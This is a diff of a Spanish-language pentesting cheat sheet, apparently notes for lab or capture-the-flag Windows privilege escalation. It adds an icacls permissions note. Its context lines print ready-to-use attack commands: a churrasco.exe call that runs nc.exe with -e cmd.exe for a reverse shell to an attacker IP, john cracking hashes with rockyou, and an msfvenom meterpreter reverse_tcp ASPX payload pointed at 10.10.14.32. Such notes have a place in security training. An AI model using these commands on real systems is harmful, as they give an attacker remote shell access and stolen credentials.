@@ -50,6 +50,8 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 pasar el archivo nc.exe a windows
 reverseshell: churrasco.exe "\\<ip atacante>\recurso\nc.exe <ip atacante> <puerto> -e cmd.exe"
 
+saber permisos icacls (directorio archivo)
+
 
 
 ######## transferir archivos de linux a windows ###########
@@ -86,8 +88,10 @@ ssh2jhon.py
 ####decifrar hash #####
 john -w:<ruta rockyou.txt> hash
 
+
 ######## reverseshell msfvenom ########
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=443 -f aspx -o shell2.aspx
+
 
 ######## ejecutar archivo para reverse shell #######
 #!/bin/bash
